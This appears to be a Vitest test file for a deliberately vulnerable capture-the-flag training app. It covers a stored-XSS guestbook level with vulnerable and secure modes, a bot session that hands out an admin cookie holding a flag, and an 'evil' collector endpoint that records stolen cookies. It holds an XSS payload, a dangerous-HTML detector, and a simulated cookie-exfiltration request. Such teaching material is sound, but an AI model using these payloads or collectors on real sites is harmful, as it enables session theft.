// @vitest-environment node
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { createApp, createRouter, toWebHandler } from 'h3';
import type { DatabaseSync } from 'node:sqlite';

import { openDatabase } from '../db';
import { PLAYER_COOKIE } from '../player';
import { MODE_COOKIE } from '../mode';
import type { Level } from './catalog';
import {
  GUESTBOOK_LEVEL_ID,
  addMessage,
  createBotSessionHandler,
  createCollectHandler,
  createEvilCollector,
  createGuestbookListHandler,
  createGuestbookPostHandler,
  hasDangerousHtml,
  listMessages,
} from './guestbook';

const PAYLOAD = '<img src=x onerror="fetch(1)">';
const PLAYER_A = '11111111-1111-4111-8111-111111111111';
const PLAYER_B = '22222222-2222-4222-8222-222222222222';

const levels: Level[] = [
  { id: GUESTBOOK_LEVEL_ID, order: 2, theme: 'XSS stockée', title: '', summary: '', instructions: '', story: '', flag: 'BREACH{stocke}' },
];

let db: DatabaseSync;
beforeEach(() => {
  db = openDatabase(':memory:');
});
afterEach(() => db.close());

function cookies(player: string, mode?: string): string {
  const parts = [`${PLAYER_COOKIE}=${player}`];
  if (mode) parts.push(`${MODE_COOKIE}=${mode}`);
  return parts.join('; ');
}

const app = (vulnerableModeEnabled: boolean, collector = createEvilCollector()) =>
  toWebHandler(
    createApp().use(
      createRouter()
        .get('/messages', createGuestbookListHandler({ db: () => db }))
        .post('/messages', createGuestbookPostHandler({ db: () => db, vulnerableModeEnabled: () => vulnerableModeEnabled }))
        .post('/bot-session', createBotSessionHandler({ levels: () => levels, vulnerableModeEnabled: () => vulnerableModeEnabled }))
        .get('/collect', createCollectHandler({ collector })),
    ),
  );

const post = (handler: ReturnType<typeof app>, path: string, player: string, mode: string, body: unknown) =>
  handler(
    new Request(`http://localhost${path}`, {
      method: 'POST',
      headers: { cookie: cookies(player, mode), 'content-type': 'application/json' },
      body: JSON.stringify(body),
    }),
  );

describe('hasDangerousHtml', () => {
  it('repère une balise ou un gestionnaire d\'événement, pas un texte ordinaire', () => {
    expect(hasDangerousHtml(PAYLOAD)).toBe(true);
    expect(hasDangerousHtml('<script>')).toBe(true);
    expect(hasDangerousHtml('Bravo pour ce CTF, 3 < 5 et 5 > 3 !')).toBe(false);
  });
});

describe('stockage du livre d\'or', () => {
  it('isole les messages par joueur et les rend dans l\'ordre de publication', () => {
    addMessage(db, PLAYER_A, 'alice', 'premier');
    addMessage(db, PLAYER_A, 'alice', 'second');
    addMessage(db, PLAYER_B, 'bob', 'chez bob');

    expect(listMessages(db, PLAYER_A).map((m) => m.body)).toEqual(['premier', 'second']);
    expect(listMessages(db, PLAYER_B).map((m) => m.body)).toEqual(['chez bob']);
  });
});

describe('POST /api/livre-d-or/messages', () => {
  it('en mode vulnérable, stocke le payload tel quel', async () => {
    const response = await post(app(true), '/messages', PLAYER_A, 'vulnerable', { author: 'agent', body: PAYLOAD });

    expect(response.status).toBe(200);
    const { messages } = await response.json();
    expect(messages.at(-1).body).toBe(PAYLOAD);
  });

  it('en mode sécurisé, refuse un message contenant du HTML (400) et ne stocke rien', async () => {
    const response = await post(app(true), '/messages', PLAYER_A, 'secure', { author: 'agent', body: PAYLOAD });

    expect(response.status).toBe(400);
    expect(listMessages(db, PLAYER_A)).toEqual([]);
  });

  it('refuse un pseudo vide ou un corps trop long (400)', async () => {
    expect((await post(app(true), '/messages', PLAYER_A, 'vulnerable', { author: '  ', body: 'x' })).status).toBe(400);
    expect((await post(app(true), '/messages', PLAYER_A, 'vulnerable', { author: 'a', body: 'x'.repeat(501) })).status).toBe(400);
  });
});

describe('POST /api/livre-d-or/bot-session', () => {
  it('délivre le cookie admin porteur du flag en mode vulnérable', async () => {
    const response = await post(app(true), '/bot-session', PLAYER_A, 'vulnerable', {});

    expect(response.status).toBe(200);
    expect((await response.json()).session).toBe('ba_admin=BREACH{stocke}');
    expect(response.headers.get('cache-control')).toBe('no-store');
  });

  it('refuse (403) et ne divulgue aucun flag en mode sécurisé', async () => {
    const response = await post(app(true), '/bot-session', PLAYER_A, 'secure', {});

    expect(response.status).toBe(403);
    expect(await response.text()).not.toContain('BREACH{');
  });

  it('refuse (403) quand le serveur interdit le mode vulnérable', async () => {
    expect((await post(app(false), '/bot-session', PLAYER_A, 'vulnerable', {})).status).toBe(403);
  });
});

describe('GET /api/evil/collect', () => {
  it('enregistre le butin exfiltré puis le restitue, isolé par joueur', async () => {
    const collector = createEvilCollector();
    const handler = app(true, collector);
    const steal = (player: string, loot: string) =>
      handler(new Request(`http://localhost/collect?c=${encodeURIComponent(loot)}`, { headers: { cookie: cookies(player) } }));

    await steal(PLAYER_A, 'ba_admin=BREACH{stocke}');
    const seen = await handler(new Request('http://localhost/collect', { headers: { cookie: cookies(PLAYER_A) } }));

    expect((await seen.json()).loot).toEqual(['ba_admin=BREACH{stocke}']);
    const other = await handler(new Request('http://localhost/collect', { headers: { cookie: cookies(PLAYER_B) } }));
    expect((await other.json()).loot).toEqual([]);
  });
});
